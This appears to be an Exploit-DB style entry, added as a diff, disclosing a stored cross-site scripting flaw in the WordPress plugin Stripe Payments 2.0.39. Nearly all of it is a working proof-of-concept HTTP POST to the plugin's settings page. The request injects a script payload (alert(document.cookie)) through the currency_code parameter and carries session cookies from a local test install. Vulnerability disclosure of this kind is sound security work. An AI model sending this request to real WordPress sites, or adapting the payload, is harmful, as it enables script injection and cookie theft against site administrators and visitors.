@@ -1,0 +1,48 @@
+# Exploit Title: WordPress Plugin Stripe Payments 2.0.39 - 'AcceptStripePayments-settings[currency_code]' Stored XSS
+# Date: 04-01-2021
+# Software Link: https://wordpress.org/plugins/stripe-payments/#developers
+# Exploit Author: Park Won Seok
+# Contact: kkigg39@gmail.com
+# Category: Webapps
+# Version: stripe-payments (Ver_2.0.39)
+# Tested on: Windows 10 x64
+
+# description:
+# A Stored Cross-site scripting (XSS) was discovered in wordpress plugins stripe-payments (Ver_2.0.39)
+# Vulnerability parameters : "AcceptStripePayments-settings[currency_code]" have Cross-Site Scripting.
+
+# POC -  Stored Cross-Site Scripting
+
+POST /wp-admin/options.php HTTP/1.1
+Host:  localhost
+Content-Length: 5786
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http:// localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer:
+http://192.168.31.131/wp-admin/edit.php?post_type=asp-products&page=stripe-payments-settings
+Accept-Encoding: gzip, deflate
+Accept-Language: ko,en-US;q=0.9,en;q=0.8
+Cookie:
+wordpress_5b1d7751a3da8a97505638936b7963ae=root%7C1609074082%7C6vGILxkmE1tZmBRmymy2iwNfvpGntlQfhEhwVLDGHFu%7C50b0c8ba4dcc6dfdd756418c9fc960d3736f93a0febf165408110ea815dbab03;
+wordpress_test_cookie=WP%20Cookie%20check;
+wordpress_logged_in_5b1d7751a3da8a97505638936b7963ae=root%7C1609074082%7C6vGILxkmE1tZmBRmymy2iwNfvpGntlQfhEhwVLDGHFu%7Cb3e517e751d2519dc5473f911230fe31c966c9c755f193344b4bdea80a09d8b4;
+asp_transient_id=36985e31f4be2b5ae0e14586c592c87d;
+wp-settings-1=mfold%3Do%26editor%3Dhtml%26posts_list_mode%3Dlist;
+wp-settings-time-1=1608903490
+Connection: close
+
+wp-asp-urlHash=general&option_page=AcceptStripePayments-settings-group&action=update&_wpnonce=eee296fed3&_wp_http_referer=%2Fwp-admin%2Fedit.php%3Fpost_type%3Dasp-products%26page%3Dstripe-payments-settings&AcceptStripePayments-settings%5Bcheckout_url%5D=http%3A%2F%2F192.168.31.131%2Fstripe-checkout-result%2F&asp_products_page_url_value=http%3A%2F%2F192.168.31.131%2Fproducts%2F&
+*AcceptStripePayments-settings%5Bcurrency_code%5D=USDjk9v0%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3edr45t*
+&AcceptStripePayments-settings%5Bcurrency_symbol%5D=%24&AcceptStripePayments-settings%5Bbutton_text%5D=Buy+Now&AcceptStripePayments-settings%5Bpopup_button_text%5D=Pay+%25s&AcceptStripePayments-settings%5Bcheckout_lang%5D=&AcceptStripePayments-settings%5Bpopup_default_country%5D=0&AcceptStripePayments-settings%5Bapi_publishable_key%5D=1&AcceptStripePayments-settings%5Bapi_secret_key%5D=2&AcceptStripePayments-settings%5Bapi_publishable_key_test%5D=3&AcceptStripePayments-settings%5Bapi_secret_key_test%5D=4&AcceptStripePayments-settings%5Bbuyer_email_type%5D=text&AcceptStripePayments-settings%5Bfrom_email_address%5D=test+%3Csales%
+40your-domain.com
+%3E&AcceptStripePayments-settings%5Bbuyer_email_subject%5D=Thank+you+for+the+purchase&AcceptStripePayments-settings%5Bbuyer_email_body%5D=Hello%0D%0A%0D%0AThank+you+for+your+purchase%21+You+ordered+the+following+item%28s%29%3A%0D%0A%0D%0A%7Bproduct_details%7D&AcceptStripePayments-settings%5Bseller_notification_email%5D=localhost%
+40google.com <http://40naver.com/>
+&AcceptStripePayments-settings%5Bseller_email_type%5D=text&AcceptStripePayments-settings%5Bseller_email_subject%5D=Notification+of+product+sale&AcceptStripePayments-settings%5Bseller_email_body%5D=Dear+Seller%0D%0A%0D%0AThis+mail+is+to+notify+you+of+a+product+sale.%0D%0A%0D%0A%7Bproduct_details%7D%0D%0A%0D%0AThe+sale+was+made+to+%7Bpayer_email%7D%0D%0A%0D%0AThanks&AcceptStripePayments-settings%5Bsend_email_on_error_to%5D=localhost%
+40google.com <http://40naver.com/>
+&AcceptStripePayments-settings%5Bprice_currency_pos%5D=left&AcceptStripePayments-settings%5Bprice_decimal_sep%5D=.&AcceptStripePayments-settings%5Bprice_thousand_sep%5D=%2C&AcceptStripePayments-settings%5Bprice_decimals_num%5D=2&AcceptStripePayments-settings%5Bcustom_field_name%5D=&AcceptStripePayments-settings%5Bcustom_field_descr%5D=&AcceptStripePayments-settings%5Bcustom_field_descr_location%5D=placeholder&AcceptStripePayments-settings%5Bcustom_field_position%5D=above&AcceptStripePayments-settings%5Bcustom_field_type%5D=text&AcceptStripePayments-settings%5Bcustom_field_validation%5D=&AcceptStripePayments-settings%5Bcustom_field_custom_validation_regex%5D=&AcceptStripePayments-settings%5Bcustom_field_custom_validation_err_msg%5D=Please+enter+valid+data&AcceptStripePayments-settings%5Btos_text%5D=I+accept+the+%3Ca+href%3D%22https%3A%2F%2Fexample.com%2Fterms-and-conditions%2F%22+target%3D%22_blank%22%3ETerms+and+Conditions%3C%2Fa%3E&AcceptStripePayments-settings%5Btos_position%5D=above&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BUSD%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BEUR%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BGBP%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BAUD%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BARS%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BBAM%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BBGN%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BBRL%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BCAD%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BCLP%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BCNY%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BCOP%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BCZK%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BDKK%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BEGP%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BHKD%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BHUF%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BINR%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BIDR%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BILS%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BJPY%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BLBP%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BMYR%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BMXN%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BNZD%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BNOK%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BPEN%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BPHP%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BPLN%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BRON%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BRUB%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BSAR%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BSGD%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BZAR%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BKRW%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BSEK%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BCHF%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BTWD%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BTHB%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BTRY%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BUYU%5D=1&AcceptStripePayments-settings%5Ballowed_currencies%5D%5BVND%5D=1&AcceptStripePayments-settings%5Bpp_additional_css%5D=&AcceptStripePayments-settings%5Brecaptcha_site_key%5D=&AcceptStripePayments-settings%5Brecaptcha_secret_key%5D=&submit=Save+Changes
